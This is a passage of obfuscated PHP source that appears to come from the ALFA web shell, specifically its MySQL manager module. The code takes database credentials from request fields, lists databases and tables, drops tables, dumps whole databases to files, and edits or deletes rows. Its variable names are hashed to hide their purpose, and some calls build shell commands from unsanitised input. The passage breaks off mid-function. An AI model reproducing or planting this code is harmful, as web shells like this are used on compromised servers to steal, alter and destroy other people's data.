if(isset($_POST['sql_host'])){
if($ptdvxdqe1ef1093be8ab258c29c47cd73a908655){
$dhkkpmvsd77d5e503ad1439f585ac494268b351b->setCharset('utf8');
$dhkkpmvsd77d5e503ad1439f585ac494268b351b->listDbs();
echo "<select name=sql_base><option value=''></option>";
while($geklwdir447b7147e84be512208dcc0995d67ebc = $dhkkpmvsd77d5e503ad1439f585ac494268b351b->fetch()) {
list($ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d, $rkptsoeg2063c1608d6e0baf80249c42e2be5804) = each($geklwdir447b7147e84be512208dcc0995d67ebc);
$tpcabxrb70998fbda3b8e12bedce9c4eba825ea8[] = $rkptsoeg2063c1608d6e0baf80249c42e2be5804;
echo '<option value="'.$rkptsoeg2063c1608d6e0baf80249c42e2be5804.'" '.($rkptsoeg2063c1608d6e0baf80249c42e2be5804==$_POST['sql_base']?'selected':'').'>'.$rkptsoeg2063c1608d6e0baf80249c42e2be5804.'</option>';
}
echo '</select>';
}else{
	echo $wgjruzxgfa816edb83e95bf0c8da580bdfd491ef;
}
}else
echo $wgjruzxgfa816edb83e95bf0c8da580bdfd491ef;
$vnqvheiic0316dfc8db23eee2c500b38d6c0f264 = $_POST['current_mysql_id'];
echo "</td>
<td><button onclick='fs(this);return false;' class='db-opt-id db-connect-btn'>Connect</button></td>
<td><input type='checkbox' name='sql_count' value='on'" . (empty($_POST['sql_count'])?'':' checked') . "> <div class=\"txtfont\">count the number of rows</div></td>
</tr>
</table>";
if($dhkkpmvsd77d5e503ad1439f585ac494268b351b->$cihfktile33d4f5439a6b8b730352a9ddd04b1b2){
	echo '<divstyle="text-align: center;font-size: 17px;margin-top: 18px;">'.$dhkkpmvsd77d5e503ad1439f585ac494268b351b->$lbigkecwc00813dcbde065b7bb6dba1660a061ed.'</div>';
}
if(!empty($vnqvheiic0316dfc8db23eee2c500b38d6c0f264)){
	$tidgekoo684b1670b967545a4bf87cb5f988b774 = "";
	if(!empty($_POST['sql_base'])){
		$tidgekoo684b1670b967545a4bf87cb5f988b774 = "d.querySelector('#tab_".$vnqvheiic0316dfc8db23eee2c500b38d6c0f264." span').innerHTML='".addslashes($_POST['sql_base'])."';";
	}
	echo "<script>mysql_cache['".$vnqvheiic0316dfc8db23eee2c500b38d6c0f264."']['host']='".addslashes($_POST['sql_host'])."';mysql_cache['".$vnqvheiic0316dfc8db23eee2c500b38d6c0f264."']['user']='".addslashes($_POST['sql_login'])."';mysql_cache['".$vnqvheiic0316dfc8db23eee2c500b38d6c0f264."']['pass']='".addslashes($_POST['sql_pass'])."';mysql_cache['".$vnqvheiic0316dfc8db23eee2c500b38d6c0f264."']['db']='".addslashes($_POST['sql_base'])."';mysql_cache['".$vnqvheiic0316dfc8db23eee2c500b38d6c0f264."']['charset']='".addslashes($_POST['charset'])."';mysql_cache['".$vnqvheiic0316dfc8db23eee2c500b38d6c0f264."']['type']='".addslashes($_POST['type'])."';mysql_cache['".$vnqvheiic0316dfc8db23eee2c500b38d6c0f264."']['count']='".addslashes($_POST['sql_count'])."';".$tidgekoo684b1670b967545a4bf87cb5f988b774."alfaConnectionHistoryUpdate();</script>";
}
if(isset($dhkkpmvsd77d5e503ad1439f585ac494268b351b) && $dhkkpmvsd77d5e503ad1439f585ac494268b351b->$vnahwpzo0a16bc32f55683128983f223de242942){
if(!empty($_POST['sql_base'])){
echo "<div class='mysql-main'><div mode='block' onclick='alfaMysqlTablePanelCtl(this);' class='tables-panel-ctl db-opt-id'>&#x3C;&#x3C;</div><div class='mysql-tables'><div><input placeholder=\"Filter Table\" style='padding: 0;margin-left: 11px;text-align:center;' type='text' name='filter_all'><button class='db-opt-id' onclick='alfaMysqlFilterAllTable(this);return false;'>Search</button></div><div class='block'><a sql_count='".(empty($_POST['sql_count'])?"false":"true")."' mode='closed' onclick='alfaMysqlFilterAllTable(this,true);' class='expander parent-expander db-opt-id' href='javascript:void(0);'><img src='http://solevisible.com/icons/menu/b_plus.png' title='Expand/Collapse All DataBases' alt='Expand/Collapse All DataBases'></a></div><ul style='margin-top: 28px;'>";
foreach ($tpcabxrb70998fbda3b8e12bedce9c4eba825ea8 as $nksstcaw24e8d17701309eab9a46949f1eab03b1) {
	echo '<li><div class="block"><i></i><b></b><a sql_count="'.(empty($_POST['sql_count'])?"false":"true").'" db_target="'.$nksstcaw24e8d17701309eab9a46949f1eab03b1.'" onclick="alfaMysqlExpander(this);" class="expander cls-'.$nksstcaw24e8d17701309eab9a46949f1eab03b1.'-expander db-opt-id" href="javascript:void(0);"><img src="http://solevisible.com/icons/menu/'.($nksstcaw24e8d17701309eab9a46949f1eab03b1 == $_POST['sql_base']?"b_minus.png":"b_plus.png").'" title="Expand/Collapse" alt="Expand/Collapse"></a></div><span class="db_name">'.$nksstcaw24e8d17701309eab9a46949f1eab03b1.'</span><div class="clearfloat"></div><div db_name="'.$nksstcaw24e8d17701309eab9a46949f1eab03b1.'" mode="'.($nksstcaw24e8d17701309eab9a46949f1eab03b1 == $_POST['sql_base']?"loaded":"no").'" class="list_container cls-'.$nksstcaw24e8d17701309eab9a46949f1eab03b1.'"><div>';
	if($nksstcaw24e8d17701309eab9a46949f1eab03b1 == $_POST['sql_base']){
		$dhkkpmvsd77d5e503ad1439f585ac494268b351b->selectdb($_POST['sql_base']);
		$alfzuvdy602d30e9c23d6740f73b1b6bad159ccd = $dhkkpmvsd77d5e503ad1439f585ac494268b351b->listTables();
		echo '<ul><li><div class="block"><i></i><b></b></div><div><input style="padding: 0;margin-left: 11px;text-align:center;" type="text" class="db-opt-id" target=".cls-'.$nksstcaw24e8d17701309eab9a46949f1eab03b1.'" placeholder="Filter Table" onkeyup="alfaMysqlFilterTable(this);" name="filter"></div></li>';
		while($geklwdir447b7147e84be512208dcc0995d67ebc = $dhkkpmvsd77d5e503ad1439f585ac494268b351b->fetch($alfzuvdy602d30e9c23d6740f73b1b6bad159ccd)){
		list($ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d, $rkptsoeg2063c1608d6e0baf80249c42e2be5804) = each($geklwdir447b7147e84be512208dcc0995d67ebc);
		if(!empty($_POST['sql_count']))
		$qhdvbdap7b8b965ad4bca0e41ab51de7b31363a1 = $dhkkpmvsd77d5e503ad1439f585ac494268b351b->fetch($dhkkpmvsd77d5e503ad1439f585ac494268b351b->query('SELECT COUNT(*) as n FROM `'.$rkptsoeg2063c1608d6e0baf80249c42e2be5804.'`'));
		$rkptsoeg2063c1608d6e0baf80249c42e2be5804 = htmlspecialchars($rkptsoeg2063c1608d6e0baf80249c42e2be5804);
		echo "<li><div class='block'><i></i><b></b></div><div class='tables-row'><input type='checkbox' name='tbl[]' value='".$rkptsoeg2063c1608d6e0baf80249c42e2be5804."'>&nbsp;<a class='db-opt-id' db_target='".$nksstcaw24e8d17701309eab9a46949f1eab03b1."' href='javascript:void(0);' onclick=\"alfaLoadTableData(this,'".$rkptsoeg2063c1608d6e0baf80249c42e2be5804."')\"><span class='mysql_tables' style='font-weight:unset;'>".$rkptsoeg2063c1608d6e0baf80249c42e2be5804."</span></a>" . (empty($_POST['sql_count'])?'&nbsp;':" <small><span style='font-weight:unset;' class='mysql_table_count'>({$qhdvbdap7b8b965ad4bca0e41ab51de7b31363a1['n']})</span></small>") . "</div></li>";
		}
		echo '</ul><div style="margin-left: 26px;margin-bottom: 10px;margin-top: 10px;"><input onchange="alfaMysqlTablesEvil(this);" class="db-opt-id" target=".cls-'.$nksstcaw24e8d17701309eab9a46949f1eab03b1.'" type="checkbox" class="db-opt-id"><select onchange="alfaMysqlTablesDumpDrop(this);" class="db-opt-id" target=".cls-'.$nksstcaw24e8d17701309eab9a46949f1eab03b1.'" class="db-opt-id" name="tables_evil" style="padding: 0;width: 100px;"><option selected>drop</option><option>dump</option></select> <button onclick="alfaMysqlTablesDumpDropBtn(this);return false;" class="db-opt-id" db_target="'.$nksstcaw24e8d17701309eab9a46949f1eab03b1.'" target=".cls-'.$nksstcaw24e8d17701309eab9a46949f1eab03b1.'" class="db-opt-id">Do it</button><div class="dump-file-holder" style="display:none;margin-left:20px;margin-top: 5px;"><input style="padding: 0;text-align:center;" type="text" placeholder="dump.sql" name="dump_file"></div></div>';
	}
	echo "</div></li>";
}
echo "</ul></div><div class='mysql-query-results'><div class='mysql-query-result-tabs'><div class='db-opt-id mysql-query-selected-tab' target='.mysql-query-result-content' onclick='alfaMysqlTabCtl(this);'>Result</div><div class='db-opt-id' target='.mysql-query-form' onclick='alfaMysqlTabCtl(this);'>Query</div><div class='db-opt-id' target='.mysql-search-area' onclick='alfaMysqlTabCtl(this);'>Search</div><div class='db-opt-id' target='.mysql-structure' onclick='alfaMysqlTabCtl(this);'>Structure</div><div class='db-opt-id' target='.mysql-insert-row' onclick='alfaMysqlTabCtl(this);'>Insert</div><div style='display:none;' class='db-opt-id' target='.mysql-edit-row' onclick='alfaMysqlTabCtl(this);'>Edit</div></div><div class='mysql-query-content mysql-insert-row mysql-hide-content'></div><div class='mysql-query-content mysql-edit-row mysql-hide-content'></div><div class='mysql-query-content mysql-search-area mysql-hide-content'></div><div class='mysql-query-content mysql-structure mysql-hide-content'></div><div class='mysql-query-content mysql-query-form mysql-hide-content'><div style='margin-bottom: 5px;'><span>Query:</span></div><textarea name='query' style='width:90%;height:100px'></textarea><p><div style='float:left;margin-left: 30px;'><input class='button db-opt-id' db_target='".$_POST['sql_base']."' onclick='alfaMysqlQuery(this);return false;' type='submit' value=' '></div></p></div><div class='mysql-query-content mysql-query-result-content'><div class='mysql-query-result-header'><div style='margin-bottom: 10px;' class='mysql-query-reporter'></div><div class='mysql-query-pager'></div></div><div class='mysql-query-table'></div></div></form></td></tr>";
}
echo "</table></div>";
echo "</div>";
}else{
echo htmlspecialchars($dhkkpmvsd77d5e503ad1439f585ac494268b351b->error());
}
echo '</div>';
alfafooter();
}
function alfaSql_manager_api(){
	$dhkkpmvsd77d5e503ad1439f585ac494268b351b = $_POST["alfa1"];
	$hcgexxko599dcce2998a6b40b1e38e8c6006cb0a = $_POST["alfa2"];
	$fwcjopuyc89ab23398f486d0df6dc8ad44ae1d4c = $_POST["alfa3"] == "true" ? true : false;
	$dhkkpmvsd77d5e503ad1439f585ac494268b351b = @json_decode($dhkkpmvsd77d5e503ad1439f585ac494268b351b, true);
	$nyztcxgh0c1d0e2ef91d68bdb15eff954448b898 = @mysqli_connect($dhkkpmvsd77d5e503ad1439f585ac494268b351b["host"], $dhkkpmvsd77d5e503ad1439f585ac494268b351b["user"], $dhkkpmvsd77d5e503ad1439f585ac494268b351b["pass"], $dhkkpmvsd77d5e503ad1439f585ac494268b351b["db"]);
	@mysqli_set_charset($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, "utf8");
	if($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898){
		if($hcgexxko599dcce2998a6b40b1e38e8c6006cb0a == "load_all_tables"){
			$lfhjdkwc9ab2ec7ea4a2041306f7bdf150fcd453 = array();
			$pgiuavwd8333ff77213fbb0deec756efcc0d6b4f = @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, "SELECT `table_schema`, `table_name` FROM `information_schema`.`tables` WHERE `table_schema` IN ('".implode("','", $dhkkpmvsd77d5e503ad1439f585ac494268b351b["databases"])."');");
			$gstvxiofe2942a04780e223b215eb8b663cf5353 = 0;
			while($belwysnaf1965a857bc285d26fe22023aa5ab50d = @mysqli_fetch_assoc($pgiuavwd8333ff77213fbb0deec756efcc0d6b4f)){
				if($fwcjopuyc89ab23398f486d0df6dc8ad44ae1d4c){
					$uawuyeal1b037e9834548dbf22f109b2c6893ce4 = @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, 'SELECT COUNT(*) FROM `'.$belwysnaf1965a857bc285d26fe22023aa5ab50d["table_schema"].'`.`'.$belwysnaf1965a857bc285d26fe22023aa5ab50d["table_name"].'`');
					if($uawuyeal1b037e9834548dbf22f109b2c6893ce4){
						$gstvxiofe2942a04780e223b215eb8b663cf5353 = @mysqli_fetch_row($uawuyeal1b037e9834548dbf22f109b2c6893ce4);
						$gstvxiofe2942a04780e223b215eb8b663cf5353 = $gstvxiofe2942a04780e223b215eb8b663cf5353[0];
					}
				}
				$lfhjdkwc9ab2ec7ea4a2041306f7bdf150fcd453[$belwysnaf1965a857bc285d26fe22023aa5ab50d["table_schema"]][] = array("name" => $belwysnaf1965a857bc285d26fe22023aa5ab50d["table_name"], "count" => (int)$gstvxiofe2942a04780e223b215eb8b663cf5353);
			}
			foreach($dhkkpmvsd77d5e503ad1439f585ac494268b351b["databases"] as $dhkkpmvsd77d5e503ad1439f585ac494268b351b){
				if(!isset($lfhjdkwc9ab2ec7ea4a2041306f7bdf150fcd453[$dhkkpmvsd77d5e503ad1439f585ac494268b351b])){
					$lfhjdkwc9ab2ec7ea4a2041306f7bdf150fcd453[$dhkkpmvsd77d5e503ad1439f585ac494268b351b] = null;
				}
			}
			echo @json_encode($lfhjdkwc9ab2ec7ea4a2041306f7bdf150fcd453);
		}elseif($hcgexxko599dcce2998a6b40b1e38e8c6006cb0a == "dump_drop"){
			if($dhkkpmvsd77d5e503ad1439f585ac494268b351b["mode"] == "drop"){
				foreach ($dhkkpmvsd77d5e503ad1439f585ac494268b351b["tables"] as $qheyssydaab9e1de16f38176f86d7a92ba337a8d) {
					@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, "DROP TABLE `".$qheyssydaab9e1de16f38176f86d7a92ba337a8d."`;");
				}
				$lfhjdkwc9ab2ec7ea4a2041306f7bdf150fcd453 = array();
				$pgiuavwd8333ff77213fbb0deec756efcc0d6b4f = @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, "SHOW TABLES;");
				$gstvxiofe2942a04780e223b215eb8b663cf5353 = 0;
				while($belwysnaf1965a857bc285d26fe22023aa5ab50d = @mysqli_fetch_array($pgiuavwd8333ff77213fbb0deec756efcc0d6b4f)){
					if($fwcjopuyc89ab23398f486d0df6dc8ad44ae1d4c){
						$uawuyeal1b037e9834548dbf22f109b2c6893ce4 = @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, 'SELECT COUNT(*) FROM `'.$belwysnaf1965a857bc285d26fe22023aa5ab50d[0].'`');
						if($uawuyeal1b037e9834548dbf22f109b2c6893ce4){
							$gstvxiofe2942a04780e223b215eb8b663cf5353 = @mysqli_fetch_row($uawuyeal1b037e9834548dbf22f109b2c6893ce4);
							$gstvxiofe2942a04780e223b215eb8b663cf5353 = $gstvxiofe2942a04780e223b215eb8b663cf5353[0];
						}
					}
					$lfhjdkwc9ab2ec7ea4a2041306f7bdf150fcd453[] = array("name" => $belwysnaf1965a857bc285d26fe22023aa5ab50d[0], "count" => (int)$gstvxiofe2942a04780e223b215eb8b663cf5353);
				}
				echo @json_encode($lfhjdkwc9ab2ec7ea4a2041306f7bdf150fcd453);
			}else{
				if(strlen(alfaEx("mysqldump"))>0){
					alfaEx("mysqldump --single-transaction --host=\"".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["host"]."\" --user=\"".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["user"]."\" --password=\"".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["pass"]."\" ".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["db"]." ".implode(" ", $dhkkpmvsd77d5e503ad1439f585ac494268b351b["tables"])."  > ".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["dump_file"]);
				}else{
					$zngnwtjj0666f0acdeed38d4cd9084ade1739498 = @fopen($dhkkpmvsd77d5e503ad1439f585ac494268b351b["dump_file"], "w");
					foreach ($dhkkpmvsd77d5e503ad1439f585ac494268b351b["tables"] as $qheyssydaab9e1de16f38176f86d7a92ba337a8d) {
						$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, 'SHOW CREATE TABLE `'.$qheyssydaab9e1de16f38176f86d7a92ba337a8d.'`');
						$tyxqkdic76ea0bebb3c22822b4f0dd9c9fd021c5 = @mysqli_fetch_array($ybaqpbzt9b207167e5381c47682c6b4f58a623fb);
						$ijhaktkuac5c74b64b4b8352ef2f181affb5ac2a = "DROP TABLE IF EXISTS `".$qheyssydaab9e1de16f38176f86d7a92ba337a8d."`;\n" . $tyxqkdic76ea0bebb3c22822b4f0dd9c9fd021c5[1].";\n";
						if($zngnwtjj0666f0acdeed38d4cd9084ade1739498) fwrite($zngnwtjj0666f0acdeed38d4cd9084ade1739498, $ijhaktkuac5c74b64b4b8352ef2f181affb5ac2a); else echo($ijhaktkuac5c74b64b4b8352ef2f181affb5ac2a);
						$wwhlmopk6d9766debe26ea242d821d3a9bef8fb4 = @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, 'SELECT * FROM `'.$qheyssydaab9e1de16f38176f86d7a92ba337a8d.'`');
						$zpqmyvjq96e89a298e0a9f469b9ae458d6afae9f = true;
						while($geklwdir447b7147e84be512208dcc0995d67ebc = @mysqli_fetch_assoc($wwhlmopk6d9766debe26ea242d821d3a9bef8fb4)){
							$aiidhoir54ca84a794888fe8d92834787dfa935a = array();
							foreach($geklwdir447b7147e84be512208dcc0995d67ebc as $damiszkt8ce4b16b22b58894aa86c421e8759df3=>$hvlrcxnj9e3669d19b675bd57058fd4664205d2a) {
							if($hvlrcxnj9e3669d19b675bd57058fd4664205d2a == null)
							$geklwdir447b7147e84be512208dcc0995d67ebc[$damiszkt8ce4b16b22b58894aa86c421e8759df3] = "''";
							elseif(is_numeric($hvlrcxnj9e3669d19b675bd57058fd4664205d2a))
							$geklwdir447b7147e84be512208dcc0995d67ebc[$damiszkt8ce4b16b22b58894aa86c421e8759df3] = $hvlrcxnj9e3669d19b675bd57058fd4664205d2a;
							else
							$geklwdir447b7147e84be512208dcc0995d67ebc[$damiszkt8ce4b16b22b58894aa86c421e8759df3] = "'".@mysqli_real_escape_string($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, $hvlrcxnj9e3669d19b675bd57058fd4664205d2a)."'";
							$aiidhoir54ca84a794888fe8d92834787dfa935a[] = "`".$damiszkt8ce4b16b22b58894aa86c421e8759df3."`";
							}
							if($zpqmyvjq96e89a298e0a9f469b9ae458d6afae9f) {
							$ijhaktkuac5c74b64b4b8352ef2f181affb5ac2a = 'INSERT INTO `'.$qheyssydaab9e1de16f38176f86d7a92ba337a8d.'` ('.implode(", ", $aiidhoir54ca84a794888fe8d92834787dfa935a).") VALUES \n\t(".implode(", ", $geklwdir447b7147e84be512208dcc0995d67ebc).')';
							$zpqmyvjq96e89a298e0a9f469b9ae458d6afae9f = false;
							} else
							$ijhaktkuac5c74b64b4b8352ef2f181affb5ac2a = "\n\t,(".implode(", ", $geklwdir447b7147e84be512208dcc0995d67ebc).')';
							if($zngnwtjj0666f0acdeed38d4cd9084ade1739498) fwrite($zngnwtjj0666f0acdeed38d4cd9084ade1739498, $ijhaktkuac5c74b64b4b8352ef2f181affb5ac2a); else echo($ijhaktkuac5c74b64b4b8352ef2f181affb5ac2a);
						}
						if(!$zpqmyvjq96e89a298e0a9f469b9ae458d6afae9f)
							if($zngnwtjj0666f0acdeed38d4cd9084ade1739498) fwrite($zngnwtjj0666f0acdeed38d4cd9084ade1739498, ";\n\n"); else echo(";\n\n");
					}
				}
				echo @json_encode(array("status" => true, "file" => $dhkkpmvsd77d5e503ad1439f585ac494268b351b["dump_file"]));
			}
		}elseif($hcgexxko599dcce2998a6b40b1e38e8c6006cb0a == "load_tables"){
			$lfhjdkwc9ab2ec7ea4a2041306f7bdf150fcd453 = array();
			$pgiuavwd8333ff77213fbb0deec756efcc0d6b4f = @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, "SHOW TABLES;");
			$gstvxiofe2942a04780e223b215eb8b663cf5353 = 0;
			while($belwysnaf1965a857bc285d26fe22023aa5ab50d = @mysqli_fetch_array($pgiuavwd8333ff77213fbb0deec756efcc0d6b4f)){
				if($fwcjopuyc89ab23398f486d0df6dc8ad44ae1d4c){
					$uawuyeal1b037e9834548dbf22f109b2c6893ce4 = @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, 'SELECT COUNT(*) FROM `'.$belwysnaf1965a857bc285d26fe22023aa5ab50d[0].'`');
					if($uawuyeal1b037e9834548dbf22f109b2c6893ce4){
						$gstvxiofe2942a04780e223b215eb8b663cf5353 = @mysqli_fetch_row($uawuyeal1b037e9834548dbf22f109b2c6893ce4);
						$gstvxiofe2942a04780e223b215eb8b663cf5353 = $gstvxiofe2942a04780e223b215eb8b663cf5353[0];
					}
				}
				$lfhjdkwc9ab2ec7ea4a2041306f7bdf150fcd453[] = array("name" => $belwysnaf1965a857bc285d26fe22023aa5ab50d[0], "count" => (int)$gstvxiofe2942a04780e223b215eb8b663cf5353);
			}
			echo @json_encode($lfhjdkwc9ab2ec7ea4a2041306f7bdf150fcd453);
		}elseif($hcgexxko599dcce2998a6b40b1e38e8c6006cb0a == "alter"){
			$dhkkpmvsd77d5e503ad1439f585ac494268b351b["alter"]["type"] = strtolower($dhkkpmvsd77d5e503ad1439f585ac494268b351b["alter"]["type"]);
			$wahcjdhba8aff967e1649a1c82ea607c881e8091 = $dhkkpmvsd77d5e503ad1439f585ac494268b351b["alter"]["type"]."(".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["alter"]["input"].")";
			$pmaqfylbe1ba83437c55caa1b29b1d3228f2591a = array("longtext", "text", "mediumtext", "tinytext");
			if(in_array($dhkkpmvsd77d5e503ad1439f585ac494268b351b["alter"]["type"], $pmaqfylbe1ba83437c55caa1b29b1d3228f2591a)){
				$wahcjdhba8aff967e1649a1c82ea607c881e8091 = $dhkkpmvsd77d5e503ad1439f585ac494268b351b["alter"]["type"];
			}
			@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, "ALTER TABLE `".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["table"]."` MODIFY COLUMN `".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["column"]."` " . $wahcjdhba8aff967e1649a1c82ea607c881e8091);
			$kowlomtecb5e100e5a9a3e7f6d1fd97512215282 = @mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898);
			if($kowlomtecb5e100e5a9a3e7f6d1fd97512215282){
				echo $kowlomtecb5e100e5a9a3e7f6d1fd97512215282;
			}else{
				echo "ok";
			}
		}elseif($hcgexxko599dcce2998a6b40b1e38e8c6006cb0a == "edit" || $hcgexxko599dcce2998a6b40b1e38e8c6006cb0a == "delete" || $hcgexxko599dcce2998a6b40b1e38e8c6006cb0a == "delete_all"){
			if($hcgexxko599dcce2998a6b40b1e38e8c6006cb0a == "edit"){
				$oxvxipgy7694f4a66316e53c8cdd9d9954bd611d = @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, "SELECT * FROM `".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["db"]."`.`".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["table"]."` WHERE `".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["col_key"]."` = '".addslashes($dhkkpmvsd77d5e503ad1439f585ac494268b351b["key"])."' LIMIT 0,1");
				$belwysnaf1965a857bc285d26fe22023aa5ab50d = @mysqli_fetch_assoc($oxvxipgy7694f4a66316e53c8cdd9d9954bd611d);
				if($belwysnaf1965a857bc285d26fe22023aa5ab50d){
					$ylrerbsc7d923585d45eaf069fa072333facbbe1 = @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, "SELECT COLUMN_NAME as name, COLUMN_TYPE, DATA_TYPE as type FROM information_schema.columns WHERE `TABLE_SCHEMA` = '".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["db"]."' AND `TABLE_NAME` = '".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["table"]."'");
					$aiidhoir54ca84a794888fe8d92834787dfa935a = array();
					$txqmhlxbddc8fc04e97385e66850818269bc89af = array();
					while($rfymspstcb08a1efc05437dd1a1358f362b2ecb8 = @mysqli_fetch_array($ylrerbsc7d923585d45eaf069fa072333facbbe1, MYSQLI_ASSOC)){
						$fxayuezca43c1b0aa53a0c908810c06ab1ff3967 = array("col_type" => $rfymspstcb08a1efc05437dd1a1358f362b2ecb8["COLUMN_TYPE"]);
						$rfymspstcb08a1efc05437dd1a1358f362b2ecb8["type"] = strtolower($rfymspstcb08a1efc05437dd1a1358f362b2ecb8["type"]);
						switch($rfymspstcb08a1efc05437dd1a1358f362b2ecb8["type"]){
							case "longtext": case "text": case "mediumtext": case "tinytext":
								$fxayuezca43c1b0aa53a0c908810c06ab1ff3967["tag"] = "textarea";
							break;
							case "int": case "smallint": case "bigint": case "tinyint": case "mediumint":
								$fxayuezca43c1b0aa53a0c908810c06ab1ff3967["tag"] = "input";
								$fxayuezca43c1b0aa53a0c908810c06ab1ff3967["type"] = "number";
							break;
							default:
								$fxayuezca43c1b0aa53a0c908810c06ab1ff3967["tag"] = "input";
								$fxayuezca43c1b0aa53a0c908810c06ab1ff3967["type"] = "text";
						}
						$aiidhoir54ca84a794888fe8d92834787dfa935a[$rfymspstcb08a1efc05437dd1a1358f362b2ecb8["name"]] = $fxayuezca43c1b0aa53a0c908810c06ab1ff3967;
					}
					foreach($belwysnaf1965a857bc285d26fe22023aa5ab50d as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d => $hvlrcxnj9e3669d19b675bd57058fd4664205d2a){
						$txqmhlxbddc8fc04e97385e66850818269bc89af[] = array("col" => $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d, "value" => htmlspecialchars($hvlrcxnj9e3669d19b675bd57058fd4664205d2a, ENT_QUOTES, 'UTF-8'), "type" => $aiidhoir54ca84a794888fe8d92834787dfa935a[$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d]);
					}
					echo @json_encode($txqmhlxbddc8fc04e97385e66850818269bc89af);
				}
			}else{
				if($hcgexxko599dcce2998a6b40b1e38e8c6006cb0a == "delete_all"){
					$uitfbsewdf347a373b8f92aa0ae3dd920a5ec2f6 = implode("', '", $dhkkpmvsd77d5e503ad1439f585ac494268b351b["rows"]);
				}else{
					$uitfbsewdf347a373b8f92aa0ae3dd920a5ec2f6 = addslashes($dhkkpmvsd77d5e503ad1439f585ac494268b351b["key"]);
				}
				$ciexurcd1b1cc7f086b3f074da452bc3129981eb = "DELETE FROM `".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["db"]."`.`".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["table"]."` WHERE `".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["col_key"]."` IN ('".$uitfbsewdf347a373b8f92aa0ae3dd920a5ec2f6."')";
				@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, $ciexurcd1b1cc7f086b3f074da452bc3129981eb);
				$kowlomtecb5e100e5a9a3e7f6d1fd97512215282 = @mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898);
				if($kowlomtecb5e100e5a9a3e7f6d1fd97512215282){
				 	$mopdlojt9acb44549b41563697bb490144ec6258 = false;
				}else{
				 	$mopdlojt9acb44549b41563697bb490144ec6258 = true;
				}
				echo @json_encode(array("status" => $mopdlojt9acb44549b41563697bb490144ec6258, "error" => $kowlomtecb5e100e5a9a3e7f6d1fd97512215282, "query" => $ciexurcd1b1cc7f086b3f074da452bc3129981eb));
			}
		}elseif($hcgexxko599dcce2998a6b40b1e38e8c6006cb0a == "update"){
			$ciexurcd1b1cc7f086b3f074da452bc3129981eb = "UPDATE `".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["db"]."`.`".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["table"]."` SET ";
			foreach($dhkkpmvsd77d5e503ad1439f585ac494268b351b["data"] as $hibqnbdud89e2ddb530bb8953b290ab0793aecb0 => $jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf){
				$ciexurcd1b1cc7f086b3f074da452bc3129981eb .= "`".$hibqnbdud89e2ddb530bb8953b290ab0793aecb0."` = '".mysqli_real_escape_string($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, $jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf)."',";
			}
			$ciexurcd1b1cc7f086b3f074da452bc3129981eb = substr($ciexurcd1b1cc7f086b3f074da452bc3129981eb, 0, -1);
		    $ciexurcd1b1cc7f086b3f074da452bc3129981eb .= "WHERE `".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["col_key"]."` = '".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["key"]."'";
			$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, $ciexurcd1b1cc7f086b3f074da452bc3129981eb);
			echo @json_encode(array("status" => $ybaqpbzt9b207167e5381c47682c6b4f58a623fb, "error" => @mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898)));
		}elseif($hcgexxko599dcce2998a6b40b1e38e8c6006cb0a == "insert"){
			$ciexurcd1b1cc7f086b3f074da452bc3129981eb = "INSERT INTO `".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["db"]."`.`".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["table"]."` ";
			foreach($dhkkpmvsd77d5e503ad1439f585ac494268b351b["data"] as $hibqnbdud89e2ddb530bb8953b290ab0793aecb0 => $jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf){
				$pwamkeco07d43db2a74336dcfbdaeeeffe6f7a19 .= $hibqnbdud89e2ddb530bb8953b290ab0793aecb0 . ",";
